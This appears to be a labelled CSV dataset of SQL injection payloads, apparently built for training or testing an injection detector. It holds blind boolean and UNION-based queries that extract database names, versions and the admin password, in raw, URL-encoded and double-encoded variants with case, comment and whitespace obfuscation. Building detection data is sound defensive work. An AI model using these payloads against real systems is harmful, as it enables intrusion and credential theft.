id%3D1%27+And+ASCII%28SUBSTRING%28%28SELECT+database%28%29%29%2C43%2C1%29%29%3D71+--,1,sqli_blind_boolean,case_var|comment_dash_dash|ws_space,url_encoded,SQLI_BLIND_BOOLEAN_002,7e10c7a648bdc4cce0d0f795d7c39fc8,dc5eb3d86c8f3152c6dad6dcb9fbaa07,84
"id=1'   and   MID((SELECT   user()),4,1)='e'   --",1,sqli_blind_boolean,case_var|comment_dash_dash|ws_mixed_ws,raw,SQLI_BLIND_BOOLEAN_005,3fac40cc753f2989913759758f5b4906,8d11b04384c138319f5dedc0e26f960d,49
id%3D1%27%2520And%2520LENGTH%28%28SELECT%2520password%2520FRoM%2520users%2520Where%2520user%3D%27admin%27%29%29%3D46%2520%2F%2A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_url_space,url_encoded,SQLI_BLIND_BOOLEAN_003,42cc65590dc8c908f393a8425b970b86,39491457fc955affeb85eb77cc785a57,127
id%253D1%2527%2Band%2BLENGTH%2528%2528SELECT%2Buser%2528%2529%2529%2529%253D20%2B%252F%252A,1,sqli_blind_boolean,case_var|comment_block_comment,double_encoded,SQLI_BLIND_BOOLEAN_003,0bd1415f772489beb144df41d26c76ff,41e5254c171d36f215d6aa0a3c594359,91
"id=1'+aND+SUBSTRING((SELECT+user()),36,1)%3D%27a%27+%23",1,sqli_blind_boolean,case_var|comment_hash|ws_plus,partially_encoded,SQLI_BLIND_BOOLEAN_001,fed002eae3890ed4caf291116bef2052,09a9fb486544af6c66f0aba654019874,55
"id=1'+And+ASCII(SUBSTRING((SELECT database()),23,1))=109+/%2A",1,sqli_blind_boolean,case_var|comment_block_comment|ws_space,partially_encoded,SQLI_BLIND_BOOLEAN_002,99e46045e246c7245bc7c00748a96c33,f3622610186b1a70fe6c3ad32f8af4ea,61
id%253D1%2527%2BaND%2BORD%2528MID%2528%2528SELECT%2Bdatabase%2528%2529%2529%252C5%252C1%2529%2529%253D99%2B%2523,1,sqli_blind_boolean,case_var|comment_hash,double_encoded,SQLI_BLIND_BOOLEAN_006,b388ebfea7713ef96a38d24254223958,16cc438204e2de122f83bb322d754f2d,112
id%253D1%2527%2BAnd%2BSUBSTRING%2528%2528SELECT%2Bpassword%2BFROM%2Busers%2BWhere%2Buser%253D%2527admin%2527%2529%252C6%252C1%2529%253D%2527e%2527%2B%2523,1,sqli_blind_boolean,case_var|comment_hash,double_encoded,SQLI_BLIND_BOOLEAN_001,49b2adc256a48270caa04f7c090ebacc,6c27c420b7ac83fffc2275ed0c9cbbe7,154
id%3D1%27+And+SUBSTRING%28%28SELECT+database%28%29%29%2C32%2C1%29%3D%27e%27+--+-,1,sqli_blind_boolean,case_var|comment_dash_dash_space,url_encoded,SQLI_BLIND_BOOLEAN_001,ff0799a96831058331de604b7645f4a1,46e01a6f86f17df7de672ee9448bdc78,80
"id%3D1%27+and+SUBSTRING((SELECT+version()),32,1)%3D%27p%27+--+-",1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_plus,partially_encoded,SQLI_BLIND_BOOLEAN_001,f8ce0f8191aa63a5feb3fdd0c65d4a00,3fbb017c69fd387c846e1416415522ea,63
"id=1' AND SUBSTRING((SELECT version()),35,1)='c' ;-- -",1,sqli_blind_boolean,comment_semicolon_comment,raw,SQLI_BLIND_BOOLEAN_001,0aa2f6bf3bd80962f1e47bf20f708a9a,e86dfa81e934c41ea20b971419a2076f,54
id=1' And (SELECT COUNT(*) FROm dvwa.users)>15 ;-- -,1,sqli_blind_boolean,case_var|comment_semicolon_comment,raw,SQLI_BLIND_BOOLEAN_004,aee7be50b750b9294338bd4373917800,896aa9bc92303c7e5ede5f83971d905f,52
id%253D1%2527%2509and%2509ASCII%2528SUBSTRING%2528%2528SELECT%2509version%2528%2529%2529%252C10%252C1%2529%2529%253D77%2509%252523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_tab,double_encoded,SQLI_BLIND_BOOLEAN_002,b9076a2d0c2e2ae24410b1810f2cecb1,f4e51fd5cb2ecad08a45c1dd31951b9b,130
"id=1' And MID((SELECT version()),19,1)='1' -- -",1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_space,raw,SQLI_BLIND_BOOLEAN_005,c7d60f47cafc1fe68c49038f1d35bbb0,dd0cf3e293aaa5ffd1b9969a7ca99999,47
id%253D1%2527%2BAND%2BLENGTH%2528%2528SELECT%2Bpassword%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%2529%253D46%2B--,1,sqli_blind_boolean,comment_dash_dash,double_encoded,SQLI_BLIND_BOOLEAN_003,d063d122990b2506189dcc9d3c5f6d81,3903545af62b1f8c92c6748d9832310d,127
"id=1' AND MID((SELECT user()),1,1)='admin' -- -",1,sqli_blind_boolean,comment_dash_dash_space,raw,SQLI_BLIND_BOOLEAN_005,510db69c620f6485678a5ee325c61efd,7da5be60e784632b8a7c66dfe66faf89,47
id%3D1%27%2520AND%2520LENGTH%28%28SELECT%2520password%2520FROM%2520users%2520WHERE%2520user%3D%27admin%27%29%29%3D31%2520--%2520-,1,sqli_blind_boolean,comment_dash_dash_space|ws_url_space,url_encoded,SQLI_BLIND_BOOLEAN_003,f5cc5979874857a3d3998fda2af1e207,c29551c147beecdb8abd7d1284beb567,129
id%253D1%2527%2B%2B%2BAND%2B%2B%2BLENGTH%2528%2528SELECT%2B%2B%2Bversion%2528%2529%2529%2529%253D9%2B%2B%2B%2523,1,sqli_blind_boolean,comment_hash|ws_mixed_ws,double_encoded,SQLI_BLIND_BOOLEAN_003,8827361d2ad7fac67c13db25604f0ac6,3bf4a2cd8db5cde018358fdea67a0c3f,112
"id=1' AND MID((SELECT user()),40,1)='b' #",1,sqli_blind_boolean,comment_hash,raw,SQLI_BLIND_BOOLEAN_005,0e98985d96f04bd3e90eedf500573079,89b3da66febf49b392cc8dcecb297ecb,41
id%3D1%27%2520AND%2520ORD%28MID%28%28SELECT%2520database%28%29%29%2C24%2C1%29%29%3D112%2520%2523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_url_space,url_encoded,SQLI_BLIND_BOOLEAN_006,0c6b89637e59a1f0dfc554fa225eb8ce,e2d4fbf222556d78686953498bbe0b8a,96
"id%3D1%27 and MID((SELECT+version()),24,1)%3D'c'+%23",1,sqli_blind_boolean,case_var|comment_url_hash,partially_encoded,SQLI_BLIND_BOOLEAN_005,bdb0883bfe4bb8f2640f700f8ce5c4b9,1322efc1fb8093e39514e84d5b6c7d8d,52
id%253D1%2527%252BAnd%252BSUBSTRING%2528%2528SELECT%252Bdatabase%2528%2529%2529%252C13%252C1%2529%253D%2527admin%2527%252B%253B--%252B-,1,sqli_blind_boolean,case_var|comment_semicolon_comment|ws_plus,double_encoded,SQLI_BLIND_BOOLEAN_001,193b4c9c81dc66274ad4da14e1207f1e,da173f302e0d1cd32354faf948504220,135
"id=1'  AND  MID((SELECT  user()),19,1)='p'  ;--  -",1,sqli_blind_boolean,case_var|comment_semicolon_comment|ws_multi_space,raw,SQLI_BLIND_BOOLEAN_005,a8f43c8fe5fc788ecf1b0985ba87e2e7,e15e309835e828f9d1df3e2ad7de4819,50
id=1%27+AND+LENGTH((SELECT+version()))=43 --,1,sqli_blind_boolean,comment_dash_dash,partially_encoded,SQLI_BLIND_BOOLEAN_003,734edc151067362f1c39ddf5c780b412,5a3966db3da199502be837b689577b51,44
"id=1' AND SUBSTRING((SELECT database()),13,1)='e' -- -",1,sqli_blind_boolean,case_var|comment_dash_dash_space,raw,SQLI_BLIND_BOOLEAN_001,4c5bf78af132269735ea3e7bdcb8fab3,a36062ba715037b77b56ad3b5ec3a1fa,54
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FMID%28%28SELECT%2F%2A%2A%2Fpassword%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fuser%3D%27admin%27%29%2C30%2C1%29%3D%27c%27%2F%2A%2A%2F%2F%2A,1,sqli_blind_boolean,comment_block_comment|ws_mixed_ws,url_encoded,SQLI_BLIND_BOOLEAN_005,19dc0305325b42817889313fdad30c41,f903240a1b5fdde114bc57d48fb72afd,194
id%3D1'%20AND%20(SELECT%20COUNT(%2A)%20From%20users)>1%20--%20-,1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_BLIND_BOOLEAN_004,d31ffbfe9e49b7365a5ef90614890e7e,64c61d22d82069db653fcbd2df356b26,63
"id%3D1%27 ++AND+++SUBSTRING((SELECT+  database()),36,1)='b%27+++%2F*",1,sqli_blind_boolean,comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_BLIND_BOOLEAN_001,69bbf047e8d8f7c5ff13d3eba6626328,ea1c7cee66c6fbb5b87487f9d1322f10,68
id%253D1%2527%2BAND%2BLENGTH%2528%2528SELECT%2Buser%2528%2529%2529%2529%253D36%2B%252523,1,sqli_blind_boolean,case_var|comment_url_hash,double_encoded,SQLI_BLIND_BOOLEAN_003,edef585a22f5cad53bd0e6b95dcff90e,4ca9d52be608b802206850ffbf5d35ec,88
id%3D1%27+and+ORD%28MID%28%28SELECT+password+From+users+Where+user%3D%27admin%27%29%2C21%2C1%29%29%3D115+%3B--+-,1,sqli_blind_boolean,case_var|comment_semicolon_comment,url_encoded,SQLI_BLIND_BOOLEAN_006,a4545a9efa475cf2e5abde05b85c7b8d,8b6e14b9c4207b92512b766162c540fc,112
id%253D1%2527%252520ANd%252520SUBSTRING%2528%2528SELECT%252520version%2528%2529%2529%252C42%252C1%2529%253D%2527a%2527%252520--,1,sqli_blind_boolean,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_BLIND_BOOLEAN_001,943b0f9e819913a35c910d78434955ae,d57cc036d35ffe031a1ffebed40f4fe5,127
id%253D1%2527%2BAND%2BLENGTH%2528%2528SELECT%2Bdatabase%2528%2529%2529%2529%253D43%2B%2523,1,sqli_blind_boolean,case_var|comment_hash,double_encoded,SQLI_BLIND_BOOLEAN_003,4bc84b966a28eaa18e64357b63367709,b14b6f4133e44e913a0ccf0d7913e57f,90
id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.tables%29%3E11+%23,1,sqli_blind_boolean,comment_hash|ws_space,url_encoded,SQLI_BLIND_BOOLEAN_004,1c43ca3ac052a804074a5935c29bae86,b1dcb41d6312f5a01b45bdb45250606b,81
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252FMID%2528%2528SELECT%252F%252A%252A%252Fdatabase%2528%2529%2529%252C35%252C1%2529%253D%2527e%2527%252F%252A%252A%252F%253B--%252F%252A%252A%252F-,1,sqli_blind_boolean,comment_semicolon_comment|ws_comment_ws,double_encoded,SQLI_BLIND_BOOLEAN_005,581f63cf5ceebe985e1a1df4db57e330,5429b4e43d8298a9507b01da05acc711,200
id%3D1%27+and+ASCII%28SUBSTRING%28%28SELECT+database%28%29%29%2C26%2C1%29%29%3D88+%3B--+-,1,sqli_blind_boolean,case_var|comment_semicolon_comment,url_encoded,SQLI_BLIND_BOOLEAN_002,3c23e1e56838dbb33ce155344fb67674,abd997791c0194875ad150c6dc8a5f92,89
id=1' and (SELECT COUNT(*) fRoM information_schema.tables)>26 --,1,sqli_blind_boolean,case_var|comment_dash_dash,raw,SQLI_BLIND_BOOLEAN_004,f6ae9a78d3a4c92f4ec6d87385f0bd51,eae08ce4ce4902db560a5cd0da047e4b,64
id%3D1%27%2520UNION%2520ALL%2520SELECT%2520null%2C%2520table_name%2Ctable_schema%2520FROM%2520information_schema.columns%2520%3B--%2520-,1,sqli_union,comment_semicolon_comment|ws_mixed_ws,url_encoded,SQLI_UNION_004,2dc077968960b6f5d3eff7e83a11040e,9ca95db9fc0a190a5859d417c286af9b,136
"id=' UnIoN SelecT table_name,table_schema --",1,sqli_union,case_var|comment_dash_dash|ws_space,raw,SQLI_UNION_001,d29edfff19a1527353fa40edea7d12b4,6c61a2ae63c6fb1302968139f793745e,44
id%253D1%2527%2BUnion%2BALL%2Bselect%2Bnull%252C%2Bcolumn_name%252Cnull%2BFrom%2Binformation_schema.tables%2B--%2B-,1,sqli_union,case_var|comment_dash_dash_space,double_encoded,SQLI_UNION_004,7960b8493c7c6cf2dae45d95e3e18acd,08abe2c32ba85f497683f8ff445fbb95,115
id%3D1%27%2BUNION%2BSELECT%2Buser%28%29%2C%2Bdatabase%28%29%2C%2Bversion%28%29%2B%3B--%2B-,1,sqli_union,comment_semicolon_comment|ws_plus,url_encoded,SQLI_UNION_006,1c823f00c0a7a59a54d312c39d0f2aca,ab4225e31db17de512259693c8a61881,90
id%3D%27+UNION+SELECT+table_name%2Ctable_schema+%3B--+-,1,sqli_union,comment_semicolon_comment,url_encoded,SQLI_UNION_001,fb2ec7f7ecdda5911627428ec17071ed,cec448dfba92a86ce3788ed2375194a9,55
id%253D%2527%252BUnion%252Bselect%252Btable_name%252Ctable_schema%252C%252Btable_name%252BFrom%252Binformation_schema.tables%252B%252523,1,sqli_union,case_var|comment_url_hash|ws_plus,double_encoded,SQLI_UNION_005,16ed5609cd827ff8865e84e0ab03d55c,13bbb190661d08b327639421e9708439,136
id%3D1%27%2BUNION%2BSELECT%2Buser%28%29%2C%2Bdatabase%28%29%2C%2Bversion%28%29%2B%2F%2A,1,sqli_union,comment_block_comment|ws_plus,url_encoded,SQLI_UNION_006,cdb2cbb1a7ad413e106c03a9e5dc28e4,1447b4bd0606b75f08c3bf5e584e85de,87
"id%3D%27 UNION+Select+column_name,null,+table_name from+information_schema.tables --",1,sqli_union,case_var|comment_dash_dash,partially_encoded,SQLI_UNION_005,0a20e2dead9ca50ea10f8fdc6f894bce,ed0984ce6eea4893e14fa9986b78d5a6,84
id%253D1%2527%252BUNION%252BSelect%252Buser%2528%2529%252C%252Bdatabase%2528%2529%252C%252Bversion%2528%2529%252B%252F%252A,1,sqli_union,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_UNION_006,0a0a154e5af804224dd1dbaac661fec2,ea8f1c7529cf17834a8680b2310037e8,123
"id=' UNION SELECT column_name,null, table_name FROM information_schema.tables -- -",1,sqli_union,comment_dash_dash_space,raw,SQLI_UNION_005,c4fb897c67324d2f84215084d4433c92,58239633fc59ae8e9c7a7316eba8edab,82
id%253D1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT%252F%252A%252A%252F1%252Cversion%2528%2529%252F%252A%252A%252FFROM%252F%252A%252A%252Fdvwa.users%252F%252A%252A%252F%2523,1,sqli_union,comment_hash|ws_comment_ws,double_encoded,SQLI_UNION_003,b4bf8c744646a65dfb08da93b61ace9e,2b2a30ca6a8a7413fed1abba8c2ddf87,186
"id=-1'%20UnIoN%20ALL%20SELECT%20column_name,null%20%23",1,sqli_union,case_var|comment_url_hash|ws_url_space,partially_encoded,SQLI_UNION_002,dee2c089903bbd56d88926237b078f7a,fe3f0d7d9176274c6cfd1d45990c60e0,54
"id%3D%27 UNioN+select+1,version(),+table_name+from+information_schema.tables+%23",1,sqli_union,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_UNION_005,806be35411506d7f7033a13d289effc3,42aa74f2062da760f42eca43f2f94318,80
"id=1'/**/UNION/**/SELECT/**/user,password/**/FROM/**/information_schema.tables/**/%23",1,sqli_union,comment_url_hash|ws_comment_ws,raw,SQLI_UNION_003,467153705a8c3ecf067474986b7a04e3,bee38667c14759e8b6d633f752134727,85
"id=1' Union ALL selecT null, user,password from users ;-- -",1,sqli_union,case_var|comment_semicolon_comment|ws_space,raw,SQLI_UNION_004,5141c53c879f15094d56e20a283adecb,88c0cac2b86536798dba5be43d52a77b,59
id%3D1%27%2BUNION%2BSELECT%2B1%2Cversion%28%29%2BFROM%2Bdvwa.users%2B%2F%2A,1,sqli_union,comment_block_comment|ws_plus,url_encoded,SQLI_UNION_003,f28c4e92a6e9e9198a1116b93a020012,0da9b0a9830c9e5e0a9b29608774b56e,75
"id%3D%27+UNION+SELECT+table_name,table_schema %3B--+-",1,sqli_union,comment_semicolon_comment,partially_encoded,SQLI_UNION_001,d26d64dbf64dbcd6dd9595ae930bc548,e7a467057d6ec0466b102d72c7042daf,53
"id=1'/**/UNION/**/SELECT/**/1,version()/**/FROM/**/users/**/;--/**/-",1,sqli_union,comment_semicolon_comment|ws_comment_ws,raw,SQLI_UNION_003,d2c1e9e6d217902742e3328613692848,ce7f1b8988b49bb2bbc329b1401065fc,68
id%253D%2527%252520UNION%252520SELECT%2525201%252C2%252C%252520table_name%252520FROM%252520information_schema.tables%252520%2523,1,sqli_union,comment_hash|ws_url_space,double_encoded,SQLI_UNION_005,513bcfd0815f4ba37834d5c098711c24,966cf6b2da41c0828ea6c421978093be,128
"id=' Union seleCt column_name,null #",1,sqli_union,case_var|comment_hash,raw,SQLI_UNION_001,14001ef18279c5af2c272cb1dc33c385,cbf313b78738bccd47f4cc6e2993434a,36
id%253D1%2527%2B%2B%2BUNION%2B%2B%2Bselect%2B%2B%2B1%252Cversion%2528%2529%2B%2B%2BFrom%2B%2B%2Binformation_schema.columns%2B%2B%2B%253B--%2B%2B%2B-,1,sqli_union,case_var|comment_semicolon_comment|ws_mixed_ws,double_encoded,SQLI_UNION_003,b6f958deef0bd27db1e5f2bb2de1fe2c,68c84c8fa5c1803240690c06fc2c55c6,148
id%253D%2527%252520union%252520seLEct%252520column_name%252Cnull%252520--,1,sqli_union,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_UNION_001,8edd28f60d6b25fe26eaa804110082fe,d7766d9c2293c1e15bdc6867f5b8fc4f,73
id%253D%2527%252520UNION%252520select%252520column_name%252Cnull%252520%252F%252A,1,sqli_union,case_var|comment_block_comment|ws_url_space,double_encoded,SQLI_UNION_001,f269c1a4d6d3783f01d77f79c6dc1486,9a0e2281cb5d875ad90013edec1e2f7d,81
id%253D%2527%2BuNIOn%2BSELECT%2Btable_name%252Ctable_schema%2B%252523,1,sqli_union,case_var|comment_url_hash,double_encoded,SQLI_UNION_001,97ba6b650215e3a6d63b296046f17c8b,c438fb3a0b451334db425ae46b1a7701,69
"id='/**/Union/**/SEleCT/**/column_name,null,/**/table_name/**/FROM/**/information_schema.tables/**/%23",1,sqli_union,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_UNION_005,8e1fd51ea60958ed57b1387013fa2b22,d414ed893436a5fbaa27b9d5f6eb2d8f,102
"id%3D'+UNION SELECT 1,version()+--",1,sqli_union,comment_dash_dash|ws_space,partially_encoded,SQLI_UNION_001,2437639818b1136d142e2c59416a7543,dae2848c878e0dba0a49bef5ecdc44e1,34
"id='+union+Select+1,version(),+table_name+FroM+information_schema.tables+;--+-",1,sqli_union,case_var|comment_semicolon_comment|ws_plus,raw,SQLI_UNION_005,9cb4714506eab48b27371517dcb9be1d,c46352c940f1ed7b6ffdcd3465dca54e,78
id%253D%2527%252F%252A%252A%252FUniOn%252F%252A%252A%252FSelect%252F%252A%252A%252Fcolumn_name%252Cnull%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFrom%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F--,1,sqli_union,case_var|comment_dash_dash|ws_mixed_ws,double_encoded,SQLI_UNION_005,e8c027b0e7d90581fdd7647a9450b79e,7f61fa058f24984fb0a5aef9936f25d1,229
id%253D%2527%2BUNION%2BSELECT%2Buser%252Cpassword%2B%253B--%2B-,1,sqli_union,comment_semicolon_comment,double_encoded,SQLI_UNION_001,375946d909d93bed22bec3c76d40aa3d,b72fa5c383bb6a641ead6b4d1d1c6991,63
"id=1'	unioN	ALL	sELECT	null,	table_name,table_schema	FROM	information_schema.tables	--	-",1,sqli_union,case_var|comment_dash_dash_space|ws_tab,raw,SQLI_UNION_004,670cf2e9a1d504e598046964661b9bbe,3f71298a27d7aad2e4488956f77cc25c,88
id%3D%27+UNION+SELECT+user%2Cpassword+%3B--+-,1,sqli_union,comment_semicolon_comment,url_encoded,SQLI_UNION_001,902e40638a0a043cd3297b8f2ade36f1,11e7ea6988397869c77c848592d825ec,45
id%3D-1%27%2BUnion%2BALL%2BselECt%2Buser%2Cpassword%2B%2F%2A,1,sqli_union,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_UNION_002,ab29bf19aecbd8aa7864b5232f525abc,6ae12622aab8b81d19a756e30e5ca3bd,60
id%3D-1%27+UNION+ALL+SELECT+1%2C2+%23,1,sqli_union,case_var|comment_hash,url_encoded,SQLI_UNION_002,143d5b892c35ac0e6b79e06225e41919,e8e428af624629111c8deada68895b15,37
id%3D%27%2BUnion%2BSelect%2B1%2Cversion%28%29%2B%23,1,sqli_union,case_var|comment_hash|ws_plus,url_encoded,SQLI_UNION_001,0569d38882868309dedf5329d7b4087c,cd5b7a21cd76727609553fd33b819e7d,51
id%253D%2527%2B%2B%2BUNION%2B%2B%2BSELECT%2B%2B%2B1%252Cversion%2528%2529%252C%2B%2B%2Btable_name%2B%2B%2BFROM%2B%2B%2Binformation_schema.tables%2B%2B%2B%253B--%2B%2B%2B-,1,sqli_union,comment_semicolon_comment|ws_mixed_ws,double_encoded,SQLI_UNION_005,89e0f9e4e0b43d8f3d8a580e907ad268,860ccdecc0969a6ec34c20af2aa33ece,170
"id%3D-1%27+union+ALL+Select+column_name,null+%23",1,sqli_union,case_var|comment_url_hash|ws_mixed_ws,partially_encoded,SQLI_UNION_002,8ae9a41a96c065b932f6f39bc68842b6,487684e87b3a7b5859da6a796fe7938b,48
id%3D1%27+++Union+++ALL+++SELECT+++null%2C+++1%2Cversion%28%29+++FROM+++dvwa.users+++%2F%2A,1,sqli_union,case_var|comment_block_comment|ws_mixed_ws,url_encoded,SQLI_UNION_004,99ff22b24619b6d4875d32a60adfae50,fde712c43d495bdc897d3e7eddfecd5a,91
id%3D1%27++UNION++SELECT++user%28%29%2C++database%28%29%2C++version%28%29++%23,1,sqli_union,comment_hash|ws_multi_space,url_encoded,SQLI_UNION_006,ad4c049650f4265ff212043a34f770a7,591d2713b5870b72588c1735af676ec1,78
id%253D%2527%2BuNIOn%2BSelect%2Btable_name%252Ctable_schema%2B%2523,1,sqli_union,case_var|comment_hash,double_encoded,SQLI_UNION_001,58f4b6e26fdc9cd9ece0bee30c5adca1,7bba28b5299e59c36d673d7257cd3f09,67
"id=1'/**/union/**/select/**/user(),/**/database(),/**/version()/**/--/**/-",1,sqli_union,case_var|comment_dash_dash_space|ws_comment_ws,raw,SQLI_UNION_006,e98370231c4e1a49005c6da17244e3b5,e98370231c4e1a49005c6da17244e3b5,74
id%253D1%2527%2B%2Bunion%2B%2BSElEct%2B%2Buser%252Cpassword%2B%2BFROM%2B%2Bdvwa.users%2B%2B--%2B%2B-,1,sqli_union,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_UNION_003,bc01f034289be2cd7bbc072f30f95e0a,59b2454b266bdcd098b6ef85822edb91,100
"id=%27+ +UNION++ SELECT+++table_name,table_schema, ++table_name+ +from+  information_schema.tables ++;--++ -",1,sqli_union,case_var|comment_semicolon_comment|ws_mixed_ws,partially_encoded,SQLI_UNION_005,bc24affb3355d1b91711d69b38438fb7,17ccb1be12b18e22894f4f52b1ca480f,108
id%3D-1%27+union+ALL+select+1%2C2+%2F%2A,1,sqli_union,case_var|comment_block_comment,url_encoded,SQLI_UNION_002,adf2a920a6d81a6110228e44e123f0b7,78ca161dcaf6c7e8eeb8354ccf2faceb,40
"id=1%27+  union+ +ALL+++SELECT + null, ++user,password ++from++ users   %2F%2A",1,sqli_union,case_var|comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_UNION_004,93c8b1b87224076b8de0d195cd7dec83,5b83aeaaf2a3043a308706d80b2f70da,78
id%3D1%27++UNION++ALL++SELECT++null%2C++1%2C2++FROM++users++%3B--++-,1,sqli_union,comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_UNION_004,fa704a14a033b2ee88364052b61f6d2a,bc7ab9a8dda6f71075563c37356ce91c,68
id%3D1%27+unIon+Select+user%28%29%2C+database%28%29%2C+version%28%29+%2523,1,sqli_union,case_var|comment_url_hash,url_encoded,SQLI_UNION_006,802e197a2ba6c55b5925cc79b832686c,faffc8344d50e2eab48abf6afbbad63d,74
"id='/**/UNION/**/SELECT/**/1,2,/**/table_name/**/FROM/**/information_schema.tables/**/#",1,sqli_union,comment_hash|ws_comment_ws,raw,SQLI_UNION_005,5d05528c07a0187a550b8aaf30a37c21,087a95648409d414216414bfb3cd0d5f,87
id%3D1%27++UNION++SELECT++1%2C2++FROM++users++--,1,sqli_union,comment_dash_dash|ws_multi_space,url_encoded,SQLI_UNION_003,93742e11fcffec845e045aacc9ff687d,73afb1a01aa8c49076280631f6cc043a,48
"id=-1'%20union%20ALL%20SeLEcT%20table_name,table_schema%20%23",1,sqli_union,case_var|comment_url_hash|ws_mixed_ws,raw,SQLI_UNION_002,e30fafa6e946ee8c54b4b8238274af63,329fbf2183ffedcb0fb1d5e032f2daab,61
id%253D1%2527%2BUnioN%2BselEct%2Buser%252Cpassword%2BFrom%2Bdvwa.users%2B%253B--%2B-,1,sqli_union,case_var|comment_semicolon_comment|ws_space,double_encoded,SQLI_UNION_003,ef45cca40e04d09c9761ac4bda130fd4,f723f28d0799f3e46cbc4a5542cb182f,84
id%253D1%2527%2B%2BUnion%2B%2BSelect%2B%2Btable_name%252Ctable_schema%2B%2BfrOm%2B%2Busers%2B%2B%252523,1,sqli_union,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_UNION_003,966f587a773c2bc5f009ccfee43bf16a,2146002f8dca5b627512905b577a6761,103
"id=1'+UNION+SELECT+user(),+database(),+version()+--+-",1,sqli_union,comment_dash_dash_space|ws_plus,raw,SQLI_UNION_006,1ddf07338570089e644857295cad5ee9,21f62ad32512232848c06f3288e22e96,53
id%3D1%27+UNION+ALL+SELECT+null%2C+user%2Cpassword+FROM+users+%2523,1,sqli_union,comment_url_hash,url_encoded,SQLI_UNION_004,430d6d606ae1cef60ac0f73797762518,4e4583ef711ce83b414d5de03d5303cf,67
id%3D%27+Union+SELECT+1%2C2%2C+table_name+from+information_schema.tables+%2523,1,sqli_union,case_var|comment_url_hash,url_encoded,SQLI_UNION_005,51722d34167ff8475d0630a47941d2d9,c93a69d0456bb3e35cd2dcad4f08b06e,78
"id%3D-1'%20UNION%20ALL%20SELECT%201,version()%20;--%20-",1,sqli_union,comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_UNION_002,472bb9cea59a508cd58691d5c6b7a0c9,202af6b311ccb69236fe2d91a8fbc36f,55
id%3D1%27+UNION+SELECT+user%28%29%2C+database%28%29%2C+version%28%29+--,1,sqli_union,comment_dash_dash,url_encoded,SQLI_UNION_006,309d980933d4569de0c6c364805ec26a,25a482e8a98224df699d73e704cd461c,71
"id=1%27+++union++ Select+  user,password+++FROM+++users+++/%2A",1,sqli_union,case_var|comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_UNION_003,3e68465a581dc0607be4b3fbd74f1a00,df976d69640235577570436e3c4d8c2d,62
id%253D%2527%252520uNioN%252520Select%252520column_name%252Cnull%252520%253B--%252520-,1,sqli_union,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_UNION_001,4baadcf7c6d6dd2049e525e1d5fde470,aaefcec4595c443deb81389d04c5667b,86
"id='/**/UnION/**/select/**/1,version(),/**/table_name/**/From/**/information_schema.tables/**/%23",1,sqli_union,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_UNION_005,5e0018fde8f216b475137f9a199e807d,f044fd1f52d79743ff4df875b6c145ab,97
id%3D1%27+unIon+select+user%2Cpassword+FROM+information_schema.columns+%3B--+-,1,sqli_union,case_var|comment_semicolon_comment,url_encoded,SQLI_UNION_003,9496c6e5026c1e88c0d9e6bbda383d2b,c886047ef6e2d35c6f72bea6e91eae7a,78
"id=1'/**/UNION/**/ALL/**/SELECT/**/null,/**/user,password/**/FROM/**/information_schema.columns/**/#",1,sqli_union,comment_hash|ws_comment_ws,raw,SQLI_UNION_004,79fbc8614e14dc943ccf29994766ad10,e60055f9e7d87c52e28135aa5751d00b,100
"id%3D1%27+UNION ALL+Select+null, 1,2 From users+--",1,sqli_union,case_var|comment_dash_dash,partially_encoded,SQLI_UNION_004,ae81ca04107038ec2b00bdc8ac5aae4e,0a40a0c47ce695e2531eda39ed8b3004,50
id%3D-1%27+++union+++ALL+++seLECT+++1%2Cversion%28%29+++%23,1,sqli_union,case_var|comment_hash|ws_mixed_ws,url_encoded,SQLI_UNION_002,270ea77c7e9c29c8e9ec30344d58b490,0365905d61dbdb414a52351d6b5be7e2,59
"id=1'+UnION+SELECT+1,version()+FROm+information_schema.tables+;--+-",1,sqli_union,case_var|comment_semicolon_comment|ws_plus,raw,SQLI_UNION_003,c90924260a78e4769a3ed347692b27fc,841b132fa57da6d5188258360e6428f4,67
id%253D1%2527%2BUnIOn%2BSELECT%2Buser%2528%2529%252C%2Bdatabase%2528%2529%252C%2Bversion%2528%2529%2B%253B--%2B-,1,sqli_union,case_var|comment_semicolon_comment,double_encoded,SQLI_UNION_006,f81f96f50151bd1a7a0091d83b2a6879,596b8156d32af54cde9904305bf39fa6,112
"id%3D1' unIoN+selEct user(),+database(),+version()+%3B--+-",1,sqli_union,case_var|comment_semicolon_comment|ws_space,partially_encoded,SQLI_UNION_006,c262e33c8375544fbda2e67ab094dcc4,173536cdf6147b0c52567fd96d52eb20,58
id%3D%27+UNION+SELECT+1%2Cversion%28%29+--+-,1,sqli_union,case_var|comment_dash_dash_space,url_encoded,SQLI_UNION_001,8e5d9f0c0286d0f7671f5b5eecf8ec57,3896c9e5b07cbc75ce00b3b2ae597dfd,44
